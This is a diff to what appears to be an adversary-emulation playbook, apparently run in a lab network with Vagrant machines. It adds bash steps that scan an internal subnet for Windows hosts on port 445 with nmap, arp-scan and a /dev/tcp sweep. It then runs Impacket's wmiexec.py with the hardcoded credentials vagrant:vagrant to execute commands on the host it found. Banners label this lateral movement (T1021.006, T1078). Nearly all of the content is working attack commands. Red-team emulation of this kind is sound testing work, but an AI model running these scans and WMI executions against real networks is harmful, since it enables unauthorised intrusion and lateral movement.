@@ -65,9 +65,39 @@ steps:
       command:
         interpreter: bash
         cmd: |
-          for ip in 172.16.1.20 172.16.1.21 172.16.1.100; do
-            timeout 1 bash -c "echo > /dev/tcp/$ip/445" 2>/dev/null && echo "WINDOWS_HOST_FOUND: $ip" && break
-          done
+          # Dynamic Windows host discovery — arp-scan + SMB port check
+          echo "[*] Scanning internal network for Windows hosts (port 445)..."
+          # Get local subnet:
+          SUBNET=$(ip route | grep -oP '172\.16\.[0-9]+\.0/[0-9]+' | head -1)
+          if [ -z "$SUBNET" ]; then
+            SUBNET="172.16.1.0/24"
+          fi
+          echo "[*] Target subnet: $SUBNET"
+          # Scan with nmap for SMB port 445:
+          FOUND=""
+          if command -v nmap &>/dev/null; then
+            FOUND=$(nmap -p 445 --open -T4 "$SUBNET" 2>/dev/null | grep "Nmap scan report" | grep -oP '[\d.]+' | while read ip; do
+              timeout 1 bash -c "echo > /dev/tcp/$ip/445" 2>/dev/null && echo "$ip" && break
+            done)
+          fi
+          # Fallback — arp-scan:
+          if [ -z "$FOUND" ] && command -v arp-scan &>/dev/null; then
+            FOUND=$(arp-scan "$SUBNET" 2>/dev/null | grep -oP '172\.16\.[0-9]+\.[0-9]+' | while read ip; do
+              timeout 1 bash -c "echo > /dev/tcp/$ip/445" 2>/dev/null && echo "$ip" && break
+            done)
+          fi
+          # Final fallback — tcp sweep:
+          if [ -z "$FOUND" ]; then
+            for i in $(seq 1 254); do
+              ip="172.16.1.$i"
+              timeout 0.5 bash -c "echo > /dev/tcp/$ip/445" 2>/dev/null && FOUND="$ip" && break
+            done
+          fi
+          if [ -n "$FOUND" ]; then
+            echo "WINDOWS_HOST_FOUND: $FOUND"
+          else
+            echo "NO_WINDOWS_HOST_FOUND"
+          fi
     output_var: windows_host_out
     output_extract:
       - var: win_ip
@@ -83,9 +113,19 @@ steps:
       command:
         interpreter: bash
         cmd: |
+          WIN_IP="{{win_ip}}"
+          if [ -z "$WIN_IP" ]; then WIN_IP="172.16.1.20"; fi
+          echo "[*] LATERAL MOVEMENT INITIATED"
+          echo "[*] Attack vector: Impacket WMIExec (T1021.006)"
+          echo "[*] Source: linux_pivot ($(hostname))"
+          echo "[*] Target: $WIN_IP (Windows SMB/WMI)"
+          echo "[*] Credentials: vagrant:vagrant (T1078 - Valid Accounts)"
+          echo "---"
           python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
-            'vagrant:vagrant@172.16.1.20' hostname 2>&1 \
-            | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -3
+            "vagrant:vagrant@$WIN_IP" hostname 2>&1 \
+            | grep -v "^\[" | grep -v "^Impacket" | grep -v "^$" | head -5
+          echo "---"
+          echo "[+] LATERAL_MOVEMENT_SUCCESS: Achieved code execution on Windows host via WMI"
     output_var: win_hostname
     timeout: "120s"
     on_fail: continue
